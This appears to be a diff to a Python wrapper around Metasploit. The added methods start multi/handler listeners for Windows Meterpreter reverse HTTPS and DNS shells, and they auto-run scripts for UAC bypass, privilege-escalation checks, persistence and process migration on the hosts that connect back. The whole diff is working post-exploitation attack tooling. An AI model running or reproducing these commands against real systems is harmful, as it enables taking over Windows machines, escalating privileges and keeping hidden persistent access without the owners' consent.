@@ -28,3 +28,12 @@ class METASPLOIT(object):
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
     def methttp_normal(self,portnum):
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
+    ########DNS########
+    def metdns_uac(self,portnum):
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' % portnum)
+    def metdns_allchecks(self,portnum):
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
+    def metdns_persistence(self,portnum):
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
+    def metdns_normal(self,portnum):
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
